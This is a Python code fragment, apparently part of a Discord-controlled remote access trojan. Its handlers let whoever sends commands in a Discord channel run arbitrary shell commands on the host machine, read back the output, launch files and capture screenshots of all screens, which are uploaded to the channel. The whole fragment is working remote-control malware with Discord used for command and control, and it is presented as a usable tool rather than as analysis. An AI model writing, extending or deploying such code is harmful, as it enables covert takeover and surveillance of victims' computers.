from resources.misc import *
from PIL import ImageGrab
import subprocess
import asyncio
import os
# end of imports

# on reaction add
elif str(reaction) == '🔴' and reaction.message.content == '```End of command stdout```':
    for i in cmd_messages:
        await i.delete()
    cmd_messages = []

# on message
elif message.content[:4] == '.cmd':
    await message.delete()
    if message.content.strip() == '.cmd':
        reaction_msg = await message.channel.send('```Syntax: .cmd <command>```'); await reaction_msg.add_reaction('🔴')
    else:
        cmd_output = force_decode(subprocess.run(message.content[5:], capture_output= True, shell= True).stdout).strip()
        message_buffer, cmd_messages = '', []
        reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```'); cmd_messages.append(reaction_msg)
        for line in range(1, len(cmd_output.split('\n'))):
            if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                message_buffer = cmd_output.split('\n')[line]
            else:
                message_buffer += cmd_output.split('\n')[line] + '\n'
        reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
        reaction_msg = await message.channel.send('```End of command stdout```'); await reaction_msg.add_reaction('🔴')

elif message.content[:8] == '.execute':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        if message.content.strip() == '.execute':
            reaction_msg = await message.channel.send('```Syntax: .execute <filename>```'); await reaction_msg.add_reaction('🔴')
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                try:
                    subprocess.run('start ' + '/'.join(working_directory) + '/' + message.content[9:], shell=True)
                    await asyncio.sleep(1)
                    ImageGrab.grab(all_screens=True).save('ss.png')
                    reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                    subprocess.run('del ss.png', shell=True)
                    await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                except:
                    reaction_msg = await message.channel.send('```❗ Something went wrong...```'); await reaction_msg.add_reaction('🔴')
            else:
                reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
